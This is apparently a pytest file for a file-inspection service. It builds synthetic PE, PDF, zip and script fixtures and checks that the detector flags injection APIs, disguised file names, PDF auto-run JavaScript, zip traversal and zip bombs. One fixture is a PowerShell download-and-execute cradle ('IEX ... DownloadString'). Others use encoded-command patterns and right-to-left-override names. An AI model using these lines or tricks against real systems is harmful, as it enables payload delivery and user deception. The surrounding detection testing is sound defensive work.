"""Static inspection of a submitted file, on synthetic fixtures only."""

from __future__ import annotations

import datetime as dt
import io
import os
import struct
import zipfile
from types import SimpleNamespace

import pytest

from app.services import inspection, samples


def _pe(*, flags: int = 0xE0000020, timestamp: int = 1_600_000_000, tail: bytes = b"") -> bytes:
    """A minimal PE: MZ stub, one section, and any extra bytes appended."""
    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x80)
    coff = struct.pack("<HHIIIHH", 0x14C, 1, timestamp, 0, 0, 0xE0, 0x102)
    optional = bytes(0xE0)
    section = struct.pack("<8sIIIIIIHHI", b".text", 0x1000, 0x1000, 0x200, 0x400, 0, 0, 0, 0, flags)
    header = bytes(dos) + b"PE\0\0" + coff + optional + section
    return header.ljust(0x400, b"\0") + b"\x90" * 0x200 + tail


def _zip(members: dict[str, bytes]) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    return buffer.getvalue()


def _codes(result: dict) -> set[str]:
    return {item["code"] for item in result["findings"]}


def test_writable_executable_section_and_injection_apis() -> None:
    tail = b" VirtualAllocEx WriteProcessMemory CreateRemoteThread "
    result = inspection.inspect_bytes(_pe(tail=tail), submitted_name="tool.exe")
    assert {"writable_executable_section", "process_injection_apis"} <= _codes(result)
    assert result["verdict"] == "suspicious"


def test_a_plain_pe_has_no_indicator() -> None:
    result = inspection.inspect_bytes(_pe(flags=0x60000020), submitted_name="tool.exe")
    assert result["verdict"] == "clean"


def test_a_future_compile_time_is_a_notice() -> None:
    future = int((dt.datetime.now(dt.UTC) + dt.timedelta(days=400)).timestamp())
    result = inspection.inspect_bytes(
        _pe(flags=0x60000020, timestamp=future), submitted_name="a.exe"
    )
    assert "future_compile_time" in _codes(result)
    assert result["verdict"] == "clean"


def test_double_extension_and_hidden_characters() -> None:
    double = inspection.inspect_bytes(_pe(flags=0x60000020), submitted_name="invoice.pdf.exe")
    assert "double_extension" in _codes(double)
    assert double["verdict"] == "suspicious"
    rtlo = inspection.inspect_bytes(b"hello", submitted_name="report‮fdp.exe")
    assert "name_hidden_characters" in _codes(rtlo)


def test_a_name_that_lies_about_the_format_is_a_warning() -> None:
    result = inspection.inspect_bytes(_pe(flags=0x60000020), submitted_name="photo.jpg")
    assert "name_mismatch" in _codes(result)
    assert result["verdict"] == "suspicious"


def test_random_content_is_flagged_as_packed() -> None:
    result = inspection.inspect_bytes(os.urandom(8192), submitted_name="blob.bin")
    assert "packed_or_encrypted" in _codes(result)
    assert result["verdict"] == "clean"


def test_plain_text_is_unknown_not_clean() -> None:
    result = inspection.inspect_bytes(b"just some notes", submitted_name="notes.txt")
    assert result["verdict"] == "unknown"


def test_pdf_javascript_on_open_is_suspicious() -> None:
    payload = b"%PDF-1.4\n1 0 obj << /OpenAction 2 0 R /JavaScript (app.alert(1)) >> endobj\n"
    result = inspection.inspect_bytes(payload, submitted_name="doc.pdf")
    assert "pdf_javascript_on_open" in _codes(result)
    assert result["verdict"] == "suspicious"


def test_zip_path_traversal_is_an_alert() -> None:
    result = inspection.inspect_bytes(_zip({"../../evil.txt": b"x"}), submitted_name="a.zip")
    assert "zip_path_traversal" in _codes(result)
    assert result["verdict"] == "suspicious"


def test_zip_members_are_inspected_one_level_deep() -> None:
    script = b"IEX (New-Object Net.WebClient).DownloadString('http://x') -enc " + b"A" * 30
    payload = _zip({"run.ps1": script, "readme.txt": b"hello"})
    result = inspection.inspect_bytes(payload, submitted_name="bundle.zip")
    members = {item["name"]: item for item in result["members"]}
    assert members["run.ps1"]["kind"] in {"script", "unknown"}
    assert members["run.ps1"]["findings"]
    assert "zip_executable_members" in _codes(result)
    assert members["readme.txt"]["verdict"] == "unknown"


def test_a_suspicious_member_makes_the_archive_suspicious() -> None:
    payload = _zip({"invoice.pdf.exe": _pe(flags=0x60000020)})
    result = inspection.inspect_bytes(payload, submitted_name="a.zip")
    assert result["verdict"] == "suspicious"
    assert any(item.get("member") == "invoice.pdf.exe" for item in result["findings"])


def test_nested_archives_are_not_opened() -> None:
    inner = _zip({"a.txt": b"x"})
    result = inspection.inspect_bytes(_zip({"inner.zip": inner}), submitted_name="outer.zip")
    assert "zip_nested_archives" in _codes(result)
    assert result["members"][0]["findings"] == []


def _info(name: str, *, flags: int = 0, size: int = 10, packed: int = 10) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name)
    info.flag_bits = flags
    info.file_size = size
    info.compress_size = packed
    return info


def test_encrypted_members_are_a_notice_and_never_read() -> None:
    found = inspection.zip_entry_findings([_info("secret.bin", flags=0x1)])
    assert [f.code for f in found] == ["zip_encrypted_members"]
    assert found[0].severity == "notice"


def test_a_bomb_shaped_archive_is_an_alert() -> None:
    found = inspection.zip_entry_findings(
        [_info("big.bin", size=500 * 1024 * 1024, packed=100 * 1024)]
    )
    assert "zip_bomb_like" in {f.code for f in found}


def test_script_patterns() -> None:
    text = b"powershell -enc " + b"QUJD" * 10 + b"\nInvoke-Expression $x\n"
    result = inspection.inspect_bytes(text, submitted_name="x.ps1")
    assert {"encoded_command", "invoke_expression"} <= _codes(result)
    assert result["verdict"] == "suspicious"


def test_a_binary_with_a_script_name_is_not_read_as_text() -> None:
    result = inspection.inspect_bytes(b"\x00\x01Invoke-Expression", submitted_name="x.ps1")
    assert "invoke_expression" not in _codes(result)


def test_garbage_that_claims_to_be_a_zip_does_not_crash() -> None:
    result = inspection.inspect_bytes(b"PK\x03\x04" + b"\xff" * 64, submitted_name="a.zip")
    assert result["verdict"] == "suspicious"
    assert "zip_unreadable" in _codes(result)


async def test_attach_inspection_stores_a_new_dict_once() -> None:
    sample = SimpleNamespace(sha256="a" * 64, details={"pe": {"x": 1}})
    await samples.attach_inspection(sample, payload=b"hello", submitted_name="n.txt")
    assert sample.details["pe"] == {"x": 1}
    assert sample.details["inspection"]["verdict"] == "unknown"
    first = sample.details["inspection"]
    await samples.attach_inspection(sample, payload=b"other", submitted_name="n.txt")
    assert sample.details["inspection"] is first


async def test_a_failing_inspection_is_recorded_not_raised(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    async def boom(*_: object, **__: object) -> dict:
        raise RuntimeError("parser exploded")

    monkeypatch.setattr(inspection, "inspect_file", boom)
    sample = SimpleNamespace(sha256="b" * 64, details={})
    await samples.attach_inspection(sample, payload=b"x", submitted_name=None)
    assert sample.details["inspection"]["verdict"] == "unknown"
    assert sample.details["inspection"]["findings"][0]["code"] == "inspection_failed"
